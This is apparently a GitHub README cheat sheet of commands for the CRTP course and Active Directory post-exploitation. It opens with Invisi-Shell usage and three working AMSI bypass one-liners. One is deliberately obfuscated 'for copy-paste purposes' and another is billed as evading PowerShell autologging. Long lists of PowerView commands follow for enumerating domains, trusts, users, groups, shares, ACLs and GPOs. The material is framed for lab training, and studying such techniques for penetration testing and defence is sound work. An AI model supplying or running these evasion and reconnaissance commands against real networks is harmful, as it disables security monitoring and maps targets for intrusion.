# CRTP_Skid
Commands and reference material useful for the CRTP course and Active Directory post-exploitation.

- [CRTP AD Attacks](#CRTP-Skid)
  - [Shell Prep & Defense Evasion](#Shell-Prep-&-Defense-Evasion)  
    - [Invisi-Shell](#Invisi-Shell)
    - [AMSI Bypass](#AMSI-Bypass)
  - [Domain Enumeration](#Domain-Enumeration)  
    - [Powerview](#Powerview)
      - [Domain](#Domain-Enum)
      - [Domain Trust](#Domain-Trust)
      - [Users Groups Computers](#Users-Groups-Computers)
      - [Share Enum](#Share-Enum)
      - [GPO](#Group-Policy-Objects)
      - [Access Control Lists](#Access-Control-Lists)
    - [AD PowerShell Module](#Active-Directory-PowerShell-Module)

## Shell Prep & Defense Evasion

### [Invisi-Shell](https://github.com/OmerYa/Invisi-Shell)
Invisi-Shell is used in the labs to bypass PowerShell security features by hooking .NET assemblies. Invisi-Shell a batch file for execution (two batch files dependant on current privilege level) that reference the invisi-shell DLL. Note - Invisi-shell may break certain functionality of certain programs run within shell.
```powershell
C:\Path\RunWithRegistryNonAdmin.bat 
C:\Path\RunWithPathAsAdmin.bat
```
### AMSI Bypass 
More AMSI Bypass techniques [here](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell)

#### ‘Plain’ AMSI bypass example:
```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
#### Obfuscation example for copy-paste purposes:
```powershell
sET-ItEM ( 'V'+'aR' +  'IA' + 'blE:1q2'  + 'uZx'  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    GeT-VariaBle  ( "1Q2U"  +"zX"  )  -VaL )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System'  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f'amsi','d','InitFaile'  ),(  "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
```
#### Another bypass, which is not detected by PowerShell autologging:
```powershell
[Delegate]::CreateDelegate(("Func``3[String, $(([String].Assembly.GetType('System.Reflection.Bindin'+'gFlags')).FullName), System.Reflection.FieldInfo]" -as [String].Assembly.GetType('System.T'+'ype')), [Object]([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')),('GetFie'+'ld')).Invoke('amsiInitFailed',(('Non'+'Public,Static') -as [String].Assembly.GetType('System.Reflection.Bindin'+'gFlags'))).SetValue($null,$True)
```
## Domain Enumeration 
### Powerview 
Powerview is referenced quite a bit in the course material, but the Microsoft-signed AD PowerShell Module can also be used and will typically evade AV sigs where PowerView may not if using an unmodified version. 

#### Domain Enum

```powershell 
Get-NetDomain
Get-NetDomain -Domain <domainname>
Get-DomainSID
Get-DomainPolicy (Get-DomainPolicy)."System Access" net accounts
```
#### Domain Trust

```powershell 
Get-NetDomainTrust
Get-NetForest
Get-NetForestDomain
Get-NetforestDomain -Forest <domain name>
Get-NetForestCatalog
Get-NetForestCatalog -Forest <domain name>
Get-NetForestTrust
Get-NetForestTrust -Forest <domain name>
Get-NetForestDomain -Verbose | Get-NetDomainTrust
```
#### Users Groups Computers 
```powershell 
Get-NetDomainController
Get-NetDomainController | select-object Name
Get-NetUser
Get-NetUser -Username <username>
Get-NetUser | select samaccountname
Get-NetUser | select samaccountname, lastlogon, pwdlastset
Get-NetUser | select samaccountname, lastlogon, pwdlastset | Sort-Object -Property lastlogon
Get-NetUser | select samaccountname, memberof
get-userproperty -Properties pwdlastset
Find-UserField -SearchField Description -SearchTerm "built"
Get-netuser | Select-Object samaccountname,description
Get-NetComputer
Get-NetComputer -FullData
Get-NetComputer -Computername <computername> -FullData
Get-NetComputer -OperatingSystem "*Server 2016*"
Get-NetComputer -fulldata | select samaccountname, operatingsystem, operatingsystemversion
Get-NetGroup
Get-NetGroup -GroupName *admin*
Get-NetGroup -Domain <domain>
Get-NetGroupMember -Groupname "Domain Admins" -Recurse
Get-NetGroupMember -Groupname "Domain Admins" -Recurse | select MemberName
Get-NetGroup -Username <username>
Get-NetlocalGroup -Computername <computername> -ListGroups
Get-NetlocalGroup -Computername <computername> -Recurse
Get-NetLoggedon -Computername <computername>
Get-LoggedonLocal -Computername <computername>
Get-LastLoggedOn -ComputerName <computername>
```
#### Share Enum

```powershell 
Invoke-ShareFinder -Verbose
Invoke-ShareFinder -ExcludeStandard -ExcludePrint -ExcludeIPC
Invoke-FileFinder -Verbose
Get-NetFileServer
```
#### Access Control Lists

```powershell 
Get-ObjectACL -SamAccountName <accountname> -ResolveGUIDS
Get-ObjectACL -ADSprefix ‘CN=Administrator,CN=Users’ -Verbose
Get-PathAcl -Path \\<Domain controller>\sysvol
Invoke-ACLScanner -ResolveGUIDs
Invoke-ACLScanner -ResolveGUIDs | select IdentityReference, ObjectDN, ActiveDirectoryRights | fl
Invoke-ACLScanner | Where-Object {$_.IdentityReference –eq [System.Security.Principal.WindowsIdentity]::GetCurrent().Name}
```

#### Group Policy Objects 

```powershell 
Get-NetGPO
Get-NetGPO -Computername <computername>
Get-NetGPOGroup
Find-GPOComputerAdmin -Computername <computername>
Find-GPOLocation -Username user -Verbose
Get-NetOU -Fulldata
Get-NetOU StudentMachines | %{Get-NetComputer -ADSPath $_}
Get-NetGPO -GPOname "{<gplink>}"
```

#### Active Directory PowerShell Module
[Microsofts AD PowerShell](https://docs.microsoft.com/en-us/powershell/module/activedirectory/?view=windowsserver2022-ps) module can also be used for domain enumeration. 
